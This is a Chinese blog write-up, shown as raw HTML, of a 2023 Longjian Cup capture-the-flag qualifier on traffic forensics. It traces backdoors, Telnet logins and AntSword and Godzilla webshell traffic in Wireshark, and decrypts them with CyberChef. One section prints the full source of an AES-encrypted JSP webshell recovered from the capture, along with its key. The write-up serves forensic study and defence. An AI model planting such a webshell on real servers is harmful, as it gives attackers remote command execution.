<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2023陇剑杯预选赛 | MTRleed</title><meta name="keywords" content="数据安全"><meta name="author" content="MTRleed"><meta name="copyright" content="MTRleed"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言该比赛属于数据安全的范畴，大部分是流量分析、数据分析、内存分析。 正文EW(web流量)ez_web_1 文件是ez_web.pcap  文件是常用的数据报存储格式，可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的，所以我们想要解析里面的数据，也必须按照一定的格式。普通的记事本打开pcap文件显示的是乱码，用安装了HEX-Editor插件的Notepad++打开，能够以16进制">
<meta property="og:type" content="article">
<meta property="og:title" content="2023陇剑杯预选赛">
<meta property="og:url" content="https://www.mtrleed.top/post/12/index.html">
<meta property="og:site_name" content="MTRleed">
<meta property="og:description" content="前言该比赛属于数据安全的范畴，大部分是流量分析、数据分析、内存分析。 正文EW(web流量)ez_web_1 文件是ez_web.pcap  文件是常用的数据报存储格式，可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的，所以我们想要解析里面的数据，也必须按照一定的格式。普通的记事本打开pcap文件显示的是乱码，用安装了HEX-Editor插件的Notepad++打开，能够以16进制">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ico.png">
<meta property="article:published_time" content="2023-09-11T16:00:00.000Z">
<meta property="article:modified_time" content="2023-11-30T08:40:57.157Z">
<meta property="article:author" content="MTRleed">
<meta property="article:tag" content="数据安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ico.png"><link rel="shortcut icon" href="/img/aa.png"><link rel="canonical" href="https://www.mtrleed.top/post/12/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2023陇剑杯预选赛',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-30 16:40:57'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/js/myjs.js"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="MTRleed" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/ig.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ico.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MTRleed</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2023陇剑杯预选赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-11T16:00:00.000Z" title="发表于 2023-09-12 00:00:00">2023-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-30T08:40:57.157Z" title="更新于 2023-11-30 16:40:57">2023-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2023陇剑杯预选赛"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该比赛属于数据安全的范畴，大部分是流量分析、数据分析、内存分析。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h2 id="EW-web流量"><a href="#EW-web流量" class="headerlink" title="EW(web流量)"></a>EW(web流量)</h2><h3 id="ez-web-1"><a href="#ez-web-1" class="headerlink" title="ez_web_1"></a>ez_web_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-1.png"></p>
<p>文件是<code>ez_web.pcap</code></p>
<blockquote>
<p>文件是常用的数据报存储格式，可以理解为就是一种文件格式，只不过里面的数据是按照特定格式存储的，所以我们想要解析里面的数据，也必须按照一定的格式。普通的记事本打开pcap文件显示的是乱码，用安装了HEX-Editor插件的Notepad++打开，能够以16进制数据的格式显示，用wireshark这种抓包工具就可以正常打开这种文件，愉快地查看里面的网络数据报了，同时wireshark也可以生成这种格式的文件。当然这些工具只是我经常使用的，还有很多其它能够查看pcap文件的工具。</p>
<p>pcap文件的总体结构就是 文件头-数据包头1-数据包1-数据包头2-数据包2 等形式</p>
</blockquote>
<p>使用<code>wireshark</code>打开文件，可以看到开始是ICMP协议的ping操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-2.png"></p>
<p>既然显示后门，也不知道是什么文件类型，先从最简单的<code>.php</code>开始吧，搜索字符串有<code>.php</code>关键字的组，然后按长度的大小排列，我们优先看长的。成功找到疑似后门文件<code>d00r.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-6.png"></p>
<p>右键追踪TCP流，可以看到它在执行命令，但这不是flag。说明在它之前还有别的文件操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-7.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-3.png"></p>
<p>在显示过滤器搜索含有<code>d00r.php</code>的tcp包，发现第一个是<code>ViewMore.php</code>，我们右键追踪tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp and frame contains &quot;d00r&quot; //查找含有相应字符串的tcp包</span><br><span class="line">或</span><br><span class="line">tcp contains &quot;d00r&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-4.png"></p>
<p>发现该文件<code>ViewMore.php</code>在进行文件的上传，被上传的文件是<code>d00r.php</code>，所以它就是后门文件。<img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-5.png"></p>
<p>所以flag为<code>ViewMore.php</code></p>
<h3 id="ez-web-2"><a href="#ez-web-2" class="headerlink" title="ez_web_2"></a>ez_web_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-8.png"></p>
<p>一直跟着<code>d00r.php</code>的流，存在<code>ifconfig</code>的命令操作，但是结果是<code>Gzip</code>格式。问题不大，我们右键追踪HTTP流就可以看见明文了</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-10.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-11.png"></p>
<p>所以flag为<code>192.168.101.132</code></p>
<h3 id="ez-web-3"><a href="#ez-web-3" class="headerlink" title="ez_web_3"></a>ez_web_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-12.png"></p>
<p>继续追踪这个tcp 10098 流，既然是写入那我们直接查找POST</p>
<p>也可以这么想既然知道了在上传文件，肯定要用到 http的request的 POST方法</p>
<p>在过滤器中 输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>这里写入了一个<code>k3y_file</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-13.png"></p>
<p>解码看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-14.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-15.png"></p>
<p>是乱码，查看文件类型后发现原来是zip，那我们直接python脚本转化回原来的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-16.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">base64_data = <span class="string">&#x27;UEsDBBQAAQAAANgDvlTRoSUSMAAAACQAAAAHAAAAa2V5LnR4dGYJZVtgRzdJtOnW1ycl/O/AJ0rmzwNXxqbCRUq2LQid0gO2yXaPBcc9baLIAwnQ71BLAQI/ABQAAQAAANgDvlTRoSUSMAAAACQAAAAHACQAAAAAAAAAIAAAAAAAAABrZXkudHh0CgAgAAAAAAABABgAOg7Zcnlz2AE6DtlyeXPYAfldXhh5c9gBUEsFBgAAAAABAAEAWQAAAFUAAAAAAA==&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;k3y_file.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(b64decode(base64_data))</span><br></pre></td></tr></table></figure>

<p>随后解压我们的文件，发现需要密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-18.png"></p>
<p>回想起刚刚在追踪流的时候好像看到过<code>passwd</code>的字符串，回去看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-19.png"></p>
<p>老样子，追踪HTTP流查看明文，疑似密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-20.png"></p>
<p>经验证确实是解压码，拿到flag<code>7d9ddff2-2d67-4eba-9e48-b91c26c42337</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ew-21.png"></p>
<p>到此本关结束，一个流量包可以出3个flag</p>
<h2 id="HW-web流量"><a href="#HW-web流量" class="headerlink" title="HW(web流量)"></a>HW(web流量)</h2><h3 id="hard-web-1"><a href="#hard-web-1" class="headerlink" title="hard_web_1"></a>hard_web_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-1.png"></p>
<p>查看端口其实考察的是应急响应中被nmap扫描到了哪些端口，可以参考<code>https://mochu.blog.csdn.net/article/details/127569366</code></p>
<p>使用以下过滤器语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.162.188 and tcp.connection.synack //ip是目标服务器ip</span><br><span class="line">或</span><br><span class="line">tcp.flags.syn==1 and tcp.flags.ack==1 //这个是nmap扫描的识别，结果注意辨别目标 ip</span><br></pre></td></tr></table></figure>

<p>过滤命令1的结果：明显80,88,888</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-2.png"></p>
<p>过滤命令2的结果：明显80,88,443,888，但是我们要注意目标服务器ip是<code>192.168.162.188</code>，所以<code>443</code>不是目标服务器开放的端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-3.png"></p>
<p>所以flag为<code>80,88,888</code></p>
<h3 id="hard-web-2"><a href="#hard-web-2" class="headerlink" title="hard_web_2"></a>hard_web_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-4.png"></p>
<p>这样的提问估计已经可以执行命令了</p>
<p>过滤http流，看到一个shell.jsp</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-5.png"></p>
<p>右键追踪HTTP流，可以看到<code>shell.jsp</code>的内容，哥斯拉（也很像冰蝎但是没有密钥协商）AES加密的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">特征：</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: keep-alive //长连接，冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销</span><br><span class="line">AES加/解密：javax.crypto.Cipher.getInstance(&quot;AES&quot;)</span><br><span class="line">类加载：ClassLoader</span><br><span class="line">反射：Class.forName（无）</span><br></pre></td></tr></table></figure>

<p>PS：选择HTTP流是因为经过gzip解码的，如果是追踪TCP流还需要解码gzip，好一个流量加密马子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;, data);Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-6.png"></p>
<p>所以我们知道了经过<code>shell.jsp</code>获取到的数据流量都是经过AES加密的，好在它<code>pwd=admin&amp;cmd=cat%20/www/wwwroot/test.com/shell.jsp</code>的操作让我们知道了密钥<code>748007e861908c03</code></p>
<p>那么我们接下来看看它都拿到了什么数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains “shell.jsp” //过滤出相应的包</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-7.png"></p>
<p>先看其中一个流</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-8.png"></p>
<p>选择原始数据，以<code>0d0a0d0a</code>（CRLF）为<code>请求体/响应体</code>和<code>请求头/响应头</code>的界限。我们一个一个组来追踪解密，最终在</p>
<p><code>tcp.stream eq 20053</code>组中解密出了flag，下面记录一下这个解密工具的使用（功能强大但是有点复杂）</p>
<p>首先我们拿到一个组</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-14.png"></p>
<p>等下我们要转换为原始数据，然后对请求的数据和响应体进行AES的解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-15.png"></p>
<p>来到<code>CyberChef</code>进行解密，我使用的是离线的。下载网址<code>https://github.com/gchq/CyberChef/releases/tag/v10.5.2</code></p>
<p>我们在<code>Operation</code>处搜索功能，将<code>AES Decrypt</code>功能往<code>Recipe</code>拖动即可使用该功能，然后在<code>key</code>处输入密钥<code>748007e861908c03</code>，在<code>input</code>输入密文，功能显示<code>input</code>的类型是<code>HEX</code>，刚好和我们的数据符合，如果不符合我们也可以自行调整。这时候要注意<code>output</code>，因为有它的提示我们才能一步一步调整功能参数进行解密。这里报错说<code>Invalid key length: 0 bytes</code>，但是我们的密钥本来就是16位，它说是8位，所以要把密钥的类型改为UTF8</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-9.png"></p>
<p>将key的HEX修改为UTF8</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-10.png"></p>
<p>这里显示需要<code>IV</code>，我们调整<code>Mode</code>为<code>ECB</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-11.png"></p>
<p>这时候似乎有输出了，但是是乱码，我们鼠标移动到魔术棒上查看说是<code>Gzip</code>格式，所以我们在<code>Operation</code>搜索<code>Gzip</code>并拖入<code>AES Decrypt</code>功能的下面（注意位置，代表着处理顺序）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-12.png"></p>
<p>可以看到输出还是乱码，魔术棒提示这应该是<code>Gunzip</code>格式，好家伙耍我？搜索<code>Gunzip</code>拖入底部</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-13.png"></p>
<p>这回又说是<code>Gzip</code>了，原因只有一个，两种格式冲突了，我们把<code>Gzip</code>往左边的<code>Operation</code>功能区拖动代表取消使用</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-16.png"></p>
<p>这时候就解密成功了！！！</p>
<p>接着将响应体的流量也解密一下，flag为<code>flag&#123;9236b29d-5488-41e6-a04b-53b0d8276542&#125;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-18.png"></p>
<p>值得注意的是工具支持识别<code>input</code>类型，比如当input类型不知道的时候，但是又觉得想<code>HEX</code>，我们可以添加<code>from hex</code>功能为auto，但是必须注意顺序，要放在解密前面，因为它是输入</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-17.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-19.png"></p>
<h3 id="hard-web-3"><a href="#hard-web-3" class="headerlink" title="hard_web_3"></a>hard_web_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-20.png"></p>
<p>webshell连接密码就是：<code>748007e861908c03</code></p>
<p>cmd5撞一下即可得知是（不过这条<code>MD5在线</code>收费）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-22.png"></p>
<p>好在另一平台可以免费查到<code>https://www.somd5.com/</code>。推荐</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/hw-21.png"></p>
<p>所以flag为<code>14mk3y</code></p>
<p>至此HW题型结束</p>
<h2 id="WS-普通流量分析"><a href="#WS-普通流量分析" class="headerlink" title="WS(普通流量分析)"></a>WS(普通流量分析)</h2><h3 id="Wireshark1-1"><a href="#Wireshark1-1" class="headerlink" title="Wireshark1_1"></a>Wireshark1_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-1.png"></p>
<p>我们看到目的IP只有两个，<code>x.x.x.1</code>一般是路由，所以被入侵的主机IP是<code>192.168.246.28</code>。很明显是被TELNET登陆的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-2.png"></p>
<p>所以flag为<code>192.168.246.28</code></p>
<h3 id="Wireshark1-2"><a href="#Wireshark1-2" class="headerlink" title="Wireshark1_2"></a>Wireshark1_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-3.png"></p>
<p>右键一个<code>Telnet</code>流，选择追踪TCP流，一眼可以看到登录的账号和密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-4.png"></p>
<p>所以flag为<code>youcannevergetthis</code></p>
<h3 id="Wireshark1-3"><a href="#Wireshark1-3" class="headerlink" title="Wireshark1_3"></a>Wireshark1_3</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-5.png"></p>
<p>从登录账号可知用户名为<code>ctf</code>，注意用户目录是波浪号<code>~</code>，注意<code>ls</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/ws-6.png"></p>
<p>所以flag为<code>Downloads</code></p>
<p>到此WS题型结束</p>
<h2 id="SSW-蚁剑流量"><a href="#SSW-蚁剑流量" class="headerlink" title="SSW(蚁剑流量)"></a>SSW(蚁剑流量)</h2><h3 id="SmallSword-1"><a href="#SmallSword-1" class="headerlink" title="SmallSword_1"></a>SmallSword_1</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-1.png"></p>
<p>既然是蚁剑连接，那么不是GET就是POST，根据蚁剑的一句话特点我们过滤一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤：</span><br><span class="line">http contains &quot;$_GET&quot;</span><br><span class="line">http contains &quot;$_POST&quot;</span><br><span class="line">或过滤tcp也行</span><br><span class="line">tcp contains &quot;$_GET&quot;</span><br><span class="line">tcp contains &quot;$_POST&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-2.png"></p>
<p>右键追踪http流，%22是双引号的url编码</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-3.png"></p>
<p>我们解码一下<code>6ea280898e404bfabd0ebb702327b18f</code>，应该是md5（你见过蚁剑密码加密的吗？没有，所以这就是密码:）</p>
<p>所以flag为<code>6ea280898e404bfabd0ebb702327b18f</code></p>
<h3 id="SmallSword-2"><a href="#SmallSword-2" class="headerlink" title="SmallSword_2"></a>SmallSword_2</h3><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-4.png"></p>
<p>在上一题中我们知道黑客是写入一句话到<code>info1.php</code>中的，所以接下来的操作必然是在访问该文件的情况下进行的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-5.png"></p>
<p>过滤出带有<code>info1.php</code>的流量，从最后往前看，因为前面大多是扫描流量，没啥关键的。蚁剑的base64传输，直接解码一条一条看即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;info1.php&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-6.png"></p>
<p>右键追踪http流，解码请求体（url和base64）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-7.png"></p>
<p>最后追踪到<code>tcp.stream eq 142</code>流发现有写文件的操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-8.png"></p>
<p>chat-GPT是这样说的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-9.png">    </p>
<p>我们<code>base64</code>解码一下写入的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023LJB/SSW-10.png"></p>
<p>所以flag为<code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </code></p>
